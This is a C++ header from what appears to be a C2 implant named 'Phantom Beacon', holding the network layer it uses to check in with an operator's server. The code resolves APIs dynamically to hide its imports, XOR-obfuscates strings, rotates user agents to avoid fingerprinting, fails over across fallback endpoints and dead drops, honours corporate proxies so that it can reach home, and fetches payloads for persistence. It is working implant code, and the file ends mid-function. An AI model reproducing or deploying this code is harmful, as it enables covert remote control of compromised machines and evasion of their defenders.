#pragma once
// ============================================================================
//  network.h — Phantom Beacon Network Layer
//  ──────────────────────────────────────────
//  HTTPS communication with the C2 server using WinHTTP.
//  Traffic appears as standard HTTPS — indistinguishable from browser traffic
//  to network inspection tools.
// ============================================================================

#ifdef _WIN32
    #ifndef WIN32_LEAN_AND_MEAN
    #define WIN32_LEAN_AND_MEAN
    #endif
    #include <windows.h>
    #include <winhttp.h>
    #include <wincrypt.h>
    // NOTE: winhttp.lib NOT linked — all WinHTTP functions resolved
    // dynamically via PEB hash lookup in winhttp_dynamic.h (no IAT)
#elif defined(__APPLE__)
    #include <curl/curl.h>
    #include <string.h>
    #include <algorithm>
#else
    // Linux + Android: raw sockets + OpenSSL (no libcurl dependency)
    #include <string.h>
    #include <algorithm>
    #include <sys/socket.h>
    #include <sys/select.h>
    #include <sys/time.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <netdb.h>
    #include <unistd.h>
    #include <fcntl.h>
    #include <errno.h>
    #include <openssl/ssl.h>
    #include <openssl/err.h>
    #include <openssl/pem.h>
    #include <openssl/x509.h>
#endif
#include <string>
#include <cstdlib>
#include <ctime>
#include <cstdint>
#include <array>
#include <vector>
#include <map>
#include <algorithm>

#include "crypto.h"
#include "evasion.h"
#include "malleable.h"
#ifdef _WIN32
#include "winhttp_dynamic.h"
#endif

namespace net {

struct C2Config;

#ifdef _WIN32
// ── WinHTTP Connection State ──────────────────────────────────────────────
// Encapsulated handles: no static globals, single inline instance.
struct WinHttpContext {
    HINTERNET hSession = nullptr;
    HINTERNET hConnect = nullptr;

    bool ensure(const C2Config& cfg);
    void cleanup();
};

inline WinHttpContext g_ctx;
#endif

// ── Configuration ──────────────────────────────────────────────────────────
#ifdef C2_USE_HTTPS
static constexpr bool kUseHttps = C2_USE_HTTPS != 0;
#else
static constexpr bool kUseHttps = true;
#endif

// ── endpoint ladder / proxy posture ────────────────────────────────────────
//
// `C2_HOSTS` is the comma-separated FALLBACK ladder (empty when the operator
// compiled a single endpoint) and `C2_PROXY` is an explicit proxy URL. Both
// are optional defines so an older c2_config.h still compiles.
#ifndef C2_HOSTS
#define C2_HOSTS ""
#endif
#ifndef C2_PROXY
#define C2_PROXY ""
#endif
// LAST-RING dead drop (see phantom.utils.dead_drop): one neutral URL the
// beacon consults ONLY after every ladder rung failed, holding the current
// endpoint as an obfuscated record. Empty = no dead drop. The XOR key is a
// FORMAT CONSTANT mirrored in dead_drop.py — changing one side alone breaks
// the record silently (the beacon would just never rotate).
#ifndef C2_DEADDROP
#define C2_DEADDROP ""
#endif
#ifndef C2_DEADDROP_KEY
#define C2_DEADDROP_KEY 0x5A
#endif
// Resolve the live endpoint from the dead drop BEFORE the first check-in
// (1 = on, the default; 0 = the dead drop stays last-ring only). Optional so
// an older generated c2_config.h still compiles.
#ifndef C2_DEADDROP_BOOTSTRAP
#define C2_DEADDROP_BOOTSTRAP 1
#endif
// PER-ENDPOINT PINS. A fallback ladder whose rungs are DIFFERENT redirectors
// cannot share one certificate: each rung presents its own. `C2_HOST_PINS`
// carries one SHA-256 DER digest per rung, aligned positionally with
// [C2_HOST] + C2_HOSTS (empty field = inherit the compiled fallback pin).
// `C2_HOST_PUBKEY_PINS` mirrors it in libcurl's sha256//<base64> SPKI shape
// for the macOS transport, which cannot pin a DER certificate. Optional so an
// older generated c2_config.h still compiles.
#ifndef C2_HOST_PINS
#define C2_HOST_PINS ""
#endif
#ifndef C2_HOST_PUBKEY_PINS
#define C2_HOST_PUBKEY_PINS ""
#endif

// The pinned C2 certificate fingerprint, when the build provides one. Pinning
// is enforced whenever it is present, independently of mTLS: a beacon that
// accepts ANY server certificate over TLS has no transport authentication at
// all (the payload is encrypted end-to-end, but the peer is unauthenticated).
#if defined(BEACON_SERVER_FINGERPRINT) || defined(BEACON_PER_ENDPOINT_PINS) \
    || defined(BEACON_SERVER_PUBKEY_PIN)
#define BEACON_PIN_ENFORCED 1
#else
#define BEACON_PIN_ENFORCED 0
#endif

// The pin callback is needed by the pin AND by the mTLS path (which installs
// it as its verifier), so it is compiled whenever either is active.
#if BEACON_PIN_ENFORCED || BEACON_MTLS_ENABLED
#define BEACON_VERIFY_CALLBACK 1
#else
#define BEACON_VERIFY_CALLBACK 0
#endif

// Like split_csv, but PRESERVES empty fields: the per-endpoint pin list is
// POSITIONAL, so "aaaa,,cccc" must decode to three entries (the middle one
// meaning "inherit the fallback pin").
inline std::vector<std::string> split_pins_keep_empty(const char* raw) {
    std::vector<std::string> out;
    if (!raw) return out;
    std::string current;
    for (const char* p = raw; *p; ++p) {
        if (*p == ',') {
            out.push_back(current);
            current.clear();
        } else if (*p != ' ' && *p != '"') {
            current.push_back(*p);
        }
    }
    out.push_back(current);
    return out;
}

inline std::vector<std::string> split_csv(const char* raw) {
    std::vector<std::string> out;
    std::string current;
    for (const char* p = raw; p && *p; ++p) {
        if (*p == ',') {
            if (!current.empty()) out.push_back(current);
            current.clear();
        } else if (*p != ' ' && *p != '"') {
            current.push_back(*p);
        }
    }
    if (!current.empty()) out.push_back(current);
    return out;
}

struct C2Config {
#ifdef _WIN32
    std::wstring host      = XOR_WDEC(XOR_WSTR(L"127.0.0.1")).c_str();
#else
    std::string  host      = XOR_DEC(XOR_STR("127.0.0.1")).c_str();
#endif
    int          port      = 8443;
    // ── the ladder ─────────────────────────────────────────────────────
    // A single compiled-in endpoint is a single point of failure: one
    // filtered address, one taken-down redirector, one provider outage ends
    // the engagement. `ladder` holds the primary plus every fallback and
    // `failover()` walks it; `failures_here` counts consecutive check-ins
    // that died on the CURRENT endpoint, so a flapping network does not
    // burn the whole ladder in three seconds.
    std::vector<std::string> ladder;
    // Per-endpoint pins keyed by ENDPOINT, not by index: prefer_endpoint()
    // and the dead-drop refresh REORDER the ladder, and an index-aligned list
    // would then pin the wrong rung. A rung with no entry inherits the
    // compiled fallback pin.
    std::map<std::string, std::string> host_pins;
    std::map<std::string, std::string> host_pubkey_pins;
    size_t       ladder_index = 0;
    int          failures_here = 0;
    int          failover_after = 3;
    // explicit proxy URL ("" = let the OS/proxy layer decide)
    std::string  proxy;
    // ── the dead drop (last ring) ──────────────────────────────────────
    // Consulted only after `dd_after` consecutive failures, independently of
    // the ladder rotation: a dead drop that is itself unreachable must cost
    // ONE request per window, never one per check-in.
    std::string  dead_drop;
    int          dd_failures = 0;
    int          dd_after = 8;
    // ── bootstrap (dead drop FIRST) ────────────────────────────────────
    // With C2_DEADDROP_BOOTSTRAP the beacon resolves its live endpoint from
    // the dead drop ONCE, before the first check-in: the compiled C2_HOST is
    // then only a fallback rung, so the address the host observes first is an
    // indirection the operator can rotate without a rebuild. A failed
    // bootstrap costs ONE request and falls through to the compiled ladder
    // unchanged; the ordinary last-ring path still retries after failures.
    bool         dd_bootstrap_done = false;

    void apply_endpoint() {
        std::string endpoint = ladder.empty() ? std::string("127.0.0.1")
                                              : ladder[ladder_index];
#ifdef _WIN32
        host = std::wstring(endpoint.begin(), endpoint.end());
#else
        host = endpoint;
#endif
    }

    // Seed the ladder from the compiled-in primary + fallbacks, then point
    // `host` at the first rung.
    void seed_ladder(const std::string& primary, const std::string& fallbacks,
                     const std::string& pins = "",
                     const std::string& pubkey_pins = "") {
        ladder.clear();
        if (!primary.empty()) ladder.push_back(primary);
        for (const std::string& extra : split_csv(fallbacks.c_str())) {
            if (!extra.empty() &&
                std::find(ladder.begin(), ladder.end(), extra) == ladder.end()) {
                ladder.push_back(extra);
            }
        }
        // Pins are positional over the SAME list built above: index i pins
        // ladder[i], and an empty field leaves that rung on the fallback pin.
        host_pins.clear();
        host_pubkey_pins.clear();
        std::vector<std::string> pin_list = split_pins_keep_empty(pins.c_str());
        std::vector<std::string> pub_list = split_pins_keep_empty(pubkey_pins.c_str());
        for (size_t i = 0; i < ladder.size(); ++i) {
            if (i < pin_list.size() && !pin_list[i].empty())
                host_pins[ladder[i]] = pin_list[i];
            if (i < pub_list.size() && !pub_list[i].empty())
                host_pubkey_pins[ladder[i]] = pub_list[i];
        }
        ladder_index = 0;
        failures_here = 0;
        apply_endpoint();
    }

    // Operator override (argv): the named endpoint becomes the FIRST rung,
    // without discarding the compiled-in ladder behind it.
    void prefer_endpoint(const std::string& endpoint) {
        if (endpoint.empty()) return;
        ladder.erase(std::remove(ladder.begin(), ladder.end(), endpoint),
                     ladder.end());
        ladder.insert(ladder.begin(), endpoint);
        ladder_index = 0;
        failures_here = 0;
        apply_endpoint();
    }

    const std::string endpoint() const {
        return ladder.empty() ? std::string("127.0.0.1") : ladder[ladder_index];
    }

    // The compiled-in fallback pin (BEACON_SERVER_FINGERPRINT), or "".
    static const std::string& compiled_pin() {
#if defined(BEACON_SERVER_FINGERPRINT)
        static const std::string pin = BEACON_SERVER_FINGERPRINT;
        return pin;
#else
        static const std::string pin;
        return pin;
#endif
    }

    // The compiled-in SPKI pin (macOS/libcurl shape), or "".
    static const std::string& compiled_pubkey_pin() {
#if defined(BEACON_SERVER_PUBKEY_PIN)
        static const std::string pin = BEACON_SERVER_PUBKEY_PIN;
        return pin;
#else
        static const std::string pin;
        return pin;
#endif
    }

    // The DER pin that authenticates the CURRENT rung: its own when it has
    // one, otherwise the compiled fallback. Empty means "no pin known": the
    // verifier treats that as a rejection when enforcement is on (fail
    // closed), so a rung nobody pinned is never silently trusted.
    const std::string& active_pin() const {
        auto it = host_pins.find(endpoint());
        if (it != host_pins.end() && !it->second.empty()) return it->second;
        return compiled_pin();
    }

    // Same for the macOS SPKI pin.
    const std::string& active_pubkey_pin() const {
        auto it = host_pubkey_pins.find(endpoint());
        if (it != host_pubkey_pins.end() && !it->second.empty())
            return it->second;
        return compiled_pubkey_pin();
    }

    // One failed check-in on the current endpoint. Returns true when the
    // ladder MOVED (the caller should drop any cached connection state).
    bool on_failure() {
        if (ladder.size() < 2) return false;
        if (++failures_here < failover_after) return false;
        ladder_index = (ladder_index + 1) % ladder.size();
        failures_here = 0;
        apply_endpoint();
        return true;
    }

    void on_success() { failures_here = 0; }
    bool         use_https = kUseHttps;
    int          sleep_ms  = 5000;   // live cadence (may be raised by outage backoff)
    int          base_sleep_ms = 5000; // operator-configured base, restored after outages
    int          jitter    = 30;
    std::string  beacon_id;
#if BEACON_AUTH_ENABLED
    mutable uint64_t request_counter = 0;
    std::array<BYTE, crypto::AUTH_SECRET_LEN> auth_secret = [] {
        std::array<BYTE, crypto::AUTH_SECRET_LEN> value{};
        std::copy(BEACON_AUTH_SECRET, BEACON_AUTH_SECRET + crypto::AUTH_SECRET_LEN,
                  value.begin());
        return value;
    }();
#endif

    int get_sleep_ms() const {
        if (jitter <= 0) return sleep_ms;
        int variation = (sleep_ms * jitter) / 100;
        int offset = (rand() % (2 * variation + 1)) - variation;
        return std::max(1000, sleep_ms + offset);
    }
};

#if BEACON_AUTH_ENABLED
struct RequestAuth {
    std::string timestamp;
    std::string counter;
    std::string nonce;
    std::string signature;
};

inline RequestAuth make_request_auth(const C2Config& cfg,
                                     const std::string& method,
                                     const std::string& path,
                                     const std::string& body) {
    RequestAuth auth;
    auth.timestamp = std::to_string(static_cast<long long>(time(nullptr)));
    auth.counter = std::to_string(++cfg.request_counter);
    auth.nonce = crypto::random_hex(16);
    std::string canonical = method + "\n" + path + "\n" + auth.timestamp +
                            "\n" + auth.counter + "\n" + auth.nonce +
                            "\n" + body;
    auth.signature = crypto::hmac_sha256_hex(
        canonical, cfg.auth_secret.data(), cfg.auth_secret.size());
    return auth;
}
#endif

#ifdef _WIN32
inline std::wstring get_random_ua();

inline bool WinHttpContext::ensure(const C2Config& cfg) {
    if (hSession && hConnect) return true;
    
    if (hConnect) { winhttp_dyn::WinHttpCloseHandleDynamic(hConnect); hConnect = nullptr; }
    if (hSession) { winhttp_dyn::WinHttpCloseHandleDynamic(hSession); hSession = nullptr; }
    
    std::wstring ua = get_random_ua();
    // ── proxy posture ─────────────────────────────────────────────────
    // `WINHTTP_ACCESS_TYPE_NO_PROXY` was a silent deployment killer: on a
    // managed endpoint the proxy is usually the ONLY egress path (PAC/WPAD
    // or an explicit proxy), so a beacon that ignores it simply never calls
    // home and the foothold looks like a failed payload. Order:
    //   1. AUTOMATIC_PROXY  — resolves PAC/WPAD/「system proxy」exactly like
    //      the browser, which is the only path that works unconfigured;
    //   2. the explicit proxy compiled into the build (C2_PROXY), which wins
    //      over auto-discovery when the operator set one;
    //   3. the platform default, as a last resort.
#ifndef WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY
#define WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY 4
#endif
    hSession = winhttp_dyn::WinHttpOpenDynamic(
        ua.c_str(),
        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) {
        hSession = winhttp_dyn::WinHttpOpenDynamic(
            ua.c_str(),
            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
            WINHTTP_NO_PROXY_NAME,
            WINHTTP_NO_PROXY_BYPASS, 0);
    }
    if (hSession && !cfg.proxy.empty()) {
        std::wstring wproxy(cfg.proxy.begin(), cfg.proxy.end());
        std::wstring bypass(L"<local>");
        WINHTTP_PROXY_INFO proxy_info{};
        proxy_info.dwAccessType = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
        proxy_info.lpszProxy = const_cast<wchar_t*>(wproxy.c_str());
        proxy_info.lpszProxyBypass = const_cast<wchar_t*>(bypass.c_str());
        winhttp_dyn::WinHttpSetOptionDynamic(
            hSession, WINHTTP_OPTION_PROXY, &proxy_info, sizeof(proxy_info));
        // An authenticating proxy needs the logged-on identity; the policy
        // is only relaxed when the operator explicitly configured a proxy.
        DWORD autologon = WINHTTP_AUTOLOGON_SECURITY_LEVEL_LOW;
        winhttp_dyn::WinHttpSetOptionDynamic(
            hSession, WINHTTP_OPTION_AUTOLOGON_POLICY, &autologon,
            sizeof(autologon));
    }
    
    if (hSession) {
        hConnect = winhttp_dyn::WinHttpConnectDynamic(
            hSession,
            cfg.host.c_str(),
            static_cast<INTERNET_PORT>(cfg.port), 0);
        if (!hConnect) {
            winhttp_dyn::WinHttpCloseHandleDynamic(hSession);
            hSession = nullptr;
            return false;
        }
    }
    return hSession && hConnect;
}

// ── User-Agent Rotation (malleable-profile driven) ────────────────────────
// The user-agent pool now comes from the malleable C2 profile so a defender
// cannot fingerprint Phantom by a fixed UA set.

inline std::wstring get_random_ua() {
    const std::string& ua = malleable::next_user_agent();
    return std::wstring(ua.begin(), ua.end());
}

inline std::string http_request(
    const C2Config& cfg,
    const std::wstring& method,
    const std::wstring& path,
    const std::string& body = "",
    const std::string& beacon_id = ""
) {
    std::string response_body;
    if (!g_ctx.ensure(cfg)) return "";

    DWORD flags = cfg.use_https ? WINHTTP_FLAG_SECURE : 0;

    // Opens a fresh request handle with timeouts and (for HTTPS) the
    // self-signed-CA-bypass security flags. Every send attempt uses its own
    // pristine handle so a failed attempt can be retried cleanly.
    auto open_new_request = [&]() -> HINTERNET {
        HINTERNET h = winhttp_dyn::WinHttpOpenRequestDynamic(
            g_ctx.hConnect,
            method.c_str(),
            path.c_str(),
            nullptr,
            WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES,
            flags);
        if (!h) return nullptr;
        winhttp_dyn::WinHttpSetTimeoutsDynamic(h, 15000, 15000, 30000, 30000);
        if (cfg.use_https) {
            DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                            SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE |
                            SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                            SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
            winhttp_dyn::WinHttpSetOptionDynamic(h, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
        }
        return h;
    };

    HINTERNET hRequest = open_new_request();
    if (!hRequest) {
        g_ctx.cleanup();
        return "";
    }
#if BEACON_MTLS_ENABLED
    // Client certificate is BEST-EFFORT: the strong per-beacon auth is the
    // HMAC-SHA256 request signature (with timestamp/counter/nonce anti-replay).
    // WinHTTP's PFXImportCertStore + CLIENT_CERT_CONTEXT binding is brittle
    // across Windows builds (private-key association fails → GLE 12044 at
    // SendRequest, killing the whole request); a transport bug must never
    // silence the beacon when its identity is already cryptographically
    // verified per-request. On failure we simply proceed without the cert —
    // the server-side middleware decides whether that is acceptable.
    HCERTSTORE client_store = nullptr;
    PCCERT_CONTEXT client_cert = nullptr;
    CRYPT_DATA_BLOB pfx_blob{};
    pfx_blob.pbData = const_cast<BYTE*>(BEACON_CLIENT_PFX);
    pfx_blob.cbData = BEACON_CLIENT_PFX_LEN;
#ifndef PKCS12_NO_PERSIST_KEY
#define PKCS12_NO_PERSIST_KEY 0x00008000
#endif
    client_store = PFXImportCertStore(&pfx_blob, nullptr, PKCS12_NO_PERSIST_KEY);
    if (!client_store) {
        // NO_PERSIST unsupported on this build: retry with persistence
        client_store = PFXImportCertStore(&pfx_blob, nullptr, 0);
    }
    if (client_store) {
        client_cert = CertEnumCertificatesInStore(client_store, nullptr);
    }
#endif
// Obfuscate the Content-Type header using compile‑time XOR
auto enc_ct = XOR_STR("Content-Type: text/plain\r\n");
std::string s_ct = XOR_DEC(enc_ct).c_str();
std::wstring headers(s_ct.begin(), s_ct.end());

// ALWAYS add X-Beacon-Id
auto enc_xb = XOR_STR("X-Beacon-Id: ");
std::string s_xb = XOR_DEC(enc_xb).c_str();
std::wstring wprefix(s_xb.begin(), s_xb.end());

auto enc_rn = XOR_STR("\r\n");
std::string s_rn = XOR_DEC(enc_rn).c_str();
std::wstring wrn(s_rn.begin(), s_rn.end());

std::wstring wid(beacon_id.begin(), beacon_id.end());
headers += wprefix + wid + wrn;
// Payload-download token: sent ONLY on payload-fetch routes (persistence
// self-install, migrate PIC pull), never on routine check-ins — the payload
// secret must not recur in every beacon request.
auto wants_payload_token = [](const std::wstring& p) {
    if (p.find(L"/api/v1/payload") != std::wstring::npos) return true;
    return p == L"/x" || p.rfind(L"/x?", 0) == 0 || p.rfind(L"/x/", 0) == 0;
};
// crypto::payload_token() is DERIVED from this beacon's own identity (the
// enroler writes an empty C2_PAYLOAD_TOKEN), so a captured binary does not
// hand over the deployment token that unlocks every payload.
const std::string& payload_tok = crypto::payload_token();
if (wants_payload_token(path) && !payload_tok.empty()) {
    std::string at = std::string(XOR_DEC(XOR_STR("X-Auth-Token: ")).c_str()) + payload_tok;
    std::wstring wat(at.begin(), at.end());
    headers += wat + wrn;
}
#if BEACON_AUTH_ENABLED
std::string method_narrow(method.begin(), method.end());
std::string path_narrow(path.begin(), path.end());
auto auth = make_request_auth(cfg, method_narrow, path_narrow, body);
headers += std::wstring(L"X-Beacon-Timestamp: ") + std::wstring(auth.timestamp.begin(), auth.timestamp.end()) + L"\r\n";
headers += std::wstring(L"X-Beacon-Counter: ") + std::wstring(auth.counter.begin(), auth.counter.end()) + L"\r\n";
headers += std::wstring(L"X-Beacon-Nonce: ") + std::wstring(auth.nonce.begin(), auth.nonce.end()) + L"\r\n";
headers += std::wstring(L"X-Beacon-Auth: ") + std::wstring(auth.signature.begin(), auth.signature.end()) + L"\r\n";
#endif

BOOL bResult = FALSE;
#if BEACON_MTLS_ENABLED
if (client_cert) {
    // Attempt 0: present the embedded client certificate.
    winhttp_dyn::WinHttpSetOptionDynamic(hRequest,
        WINHTTP_OPTION_CLIENT_CERT_CONTEXT,
        (LPVOID)client_cert, sizeof(*client_cert));
    bResult = winhttp_dyn::WinHttpSendRequestDynamic(
        hRequest,
        headers.c_str(),
        static_cast<DWORD>(headers.length()),
        WINHTTP_NO_REQUEST_DATA,
        0,
        static_cast<DWORD>(body.size()),
        0);
    if (!bResult) {
        // The PFX private-key association is brittle across Windows builds
        // (TPM/MDM machines return ERROR_WINHTTP_CLIENT_CERT_NO_ACCESS
        // _PRIVATE_KEY). Retry once WITHOUT the cert on a pristine handle:
        // the HMAC signature already authenticates this beacon on every
        // request, so dropping the cert costs nothing — staying silent
        // would cost the whole session.
        winhttp_dyn::WinHttpCloseHandleDynamic(hRequest);
        hRequest = open_new_request();
    }
}
if (!bResult && hRequest) {
    // Explicitly present NO client certificate. A NULL CERT_CONTEXT is the
    // documented "send no cert" semantic and — critically — suppresses
    // schannel's auto-selection of a machine-store certificate whose
    // private key may be unreachable (that silent pick fails EVERY request
    // on such hosts with GLE 12044, even ones wanting no cert at all).
    winhttp_dyn::WinHttpSetOptionDynamic(hRequest,
        WINHTTP_OPTION_CLIENT_CERT_CONTEXT, nullptr, 0);
    bResult = winhttp_dyn::WinHttpSendRequestDynamic(
        hRequest,
        headers.c_str(),
        static_cast<DWORD>(headers.length()),
        WINHTTP_NO_REQUEST_DATA,
        0,
        static_cast<DWORD>(body.size()),
        0);
}
#else
bResult = winhttp_dyn::WinHttpSendRequestDynamic(
    hRequest,
    headers.c_str(),
    static_cast<DWORD>(headers.length()),
    WINHTTP_NO_REQUEST_DATA,
    0,
    static_cast<DWORD>(body.size()),
    0);
#endif
if (!bResult || !hRequest) {
#if BEACON_MTLS_ENABLED
    if (client_cert) CertFreeCertificateContext(client_cert);
    if (client_store) CertCloseStore(client_store, 0);
#endif
    g_ctx.cleanup();
    winhttp_dyn::WinHttpCloseHandleDynamic(hRequest);
    return "";
}

// Send body in chunks if present
if (!body.empty()) {
    DWORD totalSent = 0;
    while (totalSent < static_cast<DWORD>(body.size())) {
        DWORD chunkSize = static_cast<DWORD>(body.size()) - totalSent;
        if (chunkSize > 65536) chunkSize = 65536;
        if (!winhttp_dyn::WinHttpWriteDataDynamic(hRequest,
                body.c_str() + totalSent,
                chunkSize,
                &chunkSize)) {
#if BEACON_MTLS_ENABLED
            if (client_cert) CertFreeCertificateContext(client_cert);
            if (client_store) CertCloseStore(client_store, 0);
#endif
            g_ctx.cleanup();
            winhttp_dyn::WinHttpCloseHandleDynamic(hRequest);
            return "";
        }
        totalSent += chunkSize;
    }
}

bResult = winhttp_dyn::WinHttpReceiveResponseDynamic(hRequest, nullptr);
    if (!bResult) {
#if BEACON_MTLS_ENABLED
        if (client_cert) CertFreeCertificateContext(client_cert);
        if (client_store) CertCloseStore(client_store, 0);
#endif
        g_ctx.cleanup();
        winhttp_dyn::WinHttpCloseHandleDynamic(hRequest);
        return "";
    }
    // ── certificate pinning (independent of mTLS) ─────────────────────
    // The security flags above still tolerate an unknown CA because the C2
    // usually presents a self-signed certificate; the PIN is what actually
    // authenticates the peer. Enforced whenever the build carries a
    // fingerprint, so a default build is no longer "TLS to anyone".
#if BEACON_PIN_ENFORCED
    // Pin the certificate the CURRENT rung presents (per-endpoint pins), not
    // one global digest: in a ladder each redirector has its own cert.
    const std::string& want_pin = cfg.active_pin();
    PCCERT_CONTEXT peer_cert = nullptr;
    DWORD peer_size = sizeof(peer_cert);
    bool pin_ok = winhttp_dyn::WinHttpQueryOptionDynamic(hRequest, WINHTTP_OPTION_SERVER_CERT_CONTEXT,
                                     &peer_cert, &peer_size) == TRUE;
    BYTE peer_hash[32] = {0};
    DWORD peer_hash_len = sizeof(peer_hash);
    if (pin_ok) {
        pin_ok = CryptHashCertificate(0, CALG_SHA_256, 0,
                                      peer_cert->pbCertEncoded,
                                      peer_cert->cbCertEncoded,
                                      peer_hash, &peer_hash_len) == TRUE;
        // Empty = no pin known for this rung: fail closed, never accept.
        pin_ok = pin_ok && !want_pin.empty() &&
                 crypto::hex_encode(peer_hash, peer_hash_len) == want_pin;
    }
    if (peer_cert) CertFreeCertificateContext(peer_cert);
    if (!pin_ok) {
#if BEACON_MTLS_ENABLED
        if (client_cert) CertFreeCertificateContext(client_cert);
        if (client_store) CertCloseStore(client_store, 0);
#endif
        g_ctx.cleanup();
        winhttp_dyn::WinHttpCloseHandleDynamic(hRequest);
        return "";
    }
#endif

    {
        DWORD dwSize = 0;
        do {
            dwSize = 0;
            if (!winhttp_dyn::WinHttpQueryDataAvailableDynamic(hRequest, &dwSize)) break;
            if (dwSize == 0) break;

            std::vector<char> buffer(dwSize + 1, 0);
            DWORD dwDownloaded = 0;
            if (winhttp_dyn::WinHttpReadDataDynamic(hRequest, buffer.data(), dwSize, &dwDownloaded)) {
                response_body.append(buffer.data(), dwDownloaded);
            }
        } while (dwSize > 0);
    }

#if BEACON_MTLS_ENABLED
    if (client_cert) CertFreeCertificateContext(client_cert);
    if (client_store) CertCloseStore(client_store, 0);
#endif
    winhttp_dyn::WinHttpCloseHandleDynamic(hRequest);
    return response_body;
}
#elif defined(__APPLE__)
// ── macOS (libcurl) —────────────────────────────────────────────────────────
inline std::string get_random_ua() {
    int r = rand() % 3;
    if (r == 0) return XOR_DEC(XOR_STR("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36")).c_str();
    if (r == 1) return XOR_DEC(XOR_STR("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0")).c_str();
    return XOR_DEC(XOR_STR("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0")).c_str();
}

static size_t WriteCallback(void *contents, size_t size, size_t nmemb, void *userp) {
    ((std::string*)userp)->append((char*)contents, size * nmemb);
    return size * nmemb;
}

inline std::string http_request(
    const C2Config& cfg,
    const std::wstring& method,
    const std::wstring& path,
    const std::string& body = "",
    const std::string& beacon_id = ""
) {
    std::string response_body;
    CURL *curl = curl_easy_init();
    if (!curl) return "";

#if BEACON_MTLS_ENABLED
    struct curl_blob ca_blob{const_cast<char*>(BEACON_CLIENT_CA_PEM),
                             strlen(BEACON_CLIENT_CA_PEM), CURL_BLOB_COPY};
    struct curl_blob cert_blob{const_cast<char*>(BEACON_CLIENT_CERT_PEM),
                               strlen(BEACON_CLIENT_CERT_PEM), CURL_BLOB_COPY};
    struct curl_blob key_blob{const_cast<char*>(BEACON_CLIENT_KEY_PEM),
                              strlen(BEACON_CLIENT_KEY_PEM), CURL_BLOB_COPY};
    curl_easy_setopt(curl, CURLOPT_CAINFO_BLOB, &ca_blob);
    curl_easy_setopt(curl, CURLOPT_SSLCERT_BLOB, &cert_blob);
    curl_easy_setopt(curl, CURLOPT_SSLKEY_BLOB, &key_blob);
#endif

    std::string proto = cfg.use_https ? XOR_DEC(XOR_STR("https://")).c_str() : XOR_DEC(XOR_STR("http://")).c_str();
    std::string host_narrow(cfg.host.begin(), cfg.host.end());
    std::string path_narrow(path.begin(), path.end());
    std::string url = proto + host_narrow + XOR_DEC(XOR_STR(":")).c_str() + std::to_string(cfg.port) + path_narrow;

    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    curl_easy_setopt(curl, CURLOPT_USERAGENT, get_random_ua().c_str());
    
    std::string method_narrow(method.begin(), method.end());
    if (method_narrow == XOR_DEC(XOR_STR("POST")).c_str()) {
        curl_easy_setopt(curl, CURLOPT_POST, 1L);
        if (!body.empty()) {
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, body.c_str());
            curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, body.size());
        }
    } else {
        curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, method_narrow.c_str());
    }

    curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 5L);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);

    // Proxy: libcurl reads the environment on its own, which is usually the
    // right answer (the operator's shell already has http(s)_proxy set). An
    // explicitly compiled-in proxy takes precedence.
    if (!cfg.proxy.empty()) {
        curl_easy_setopt(curl, CURLOPT_PROXY, cfg.proxy.c_str());
    }

    struct curl_slist *headers = NULL;
#if BEACON_AUTH_ENABLED
    auto auth = make_request_auth(cfg, method_narrow, path_narrow, body);
#endif
    auto enc_ct = XOR_STR("Content-Type: text/plain");
    headers = curl_slist_append(headers, XOR_DEC(enc_ct).c_str());
    if (!beacon_id.empty()) {
        auto enc_xb = XOR_STR("X-Beacon-Id: ");
        std::string h = std::string(XOR_DEC(enc_xb).c_str()) + beacon_id;
        headers = curl_slist_append(headers, h.c_str());
    }
    auto wants_tok = [](const std::string& u) {
        if (u.find("/api/v1/payload") != std::string::npos) return true;
        return u.rfind("/x", 0) == 0 && (u.size() == 2 || u[2] == '?' || u[2] == '/');
    };
    const std::string& curl_payload_tok = crypto::payload_token();
    if (wants_tok(url) && !curl_payload_tok.empty())
        headers = curl_slist_append(headers, (std::string(XOR_DEC(XOR_STR("X-Auth-Token: ")).c_str()) + curl_payload_tok).c_str());
#if BEACON_AUTH_ENABLED
    headers = curl_slist_append(headers, ("X-Beacon-Timestamp: " + auth.timestamp).c_str());
    headers = curl_slist_append(headers, ("X-Beacon-Counter: " + auth.counter).c_str());
    headers = curl_slist_append(headers, ("X-Beacon-Nonce: " + auth.nonce).c_str());
    headers = curl_slist_append(headers, ("X-Beacon-Auth: " + auth.signature).c_str());
#endif
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_body);

    if (cfg.use_https) {
#if BEACON_PIN_ENFORCED
        // PIN-FIRST, like Windows/Linux. libcurl can only pin the public key
        // (SPKI), not the DER certificate, so the generator emits the same
        // rung's key in sha256//<base64> shape. With a pin present libcurl's
        // verification is switched ON and the pinned key IS the decision: a
        // self-signed C2 is accepted exactly when its key matches. A rung
        // with no known pin gets an impossible pin, so it fails closed
        // instead of silently trusting an unauthenticated peer.
        const std::string& spki = cfg.active_pubkey_pin();
        if (spki.empty()) {
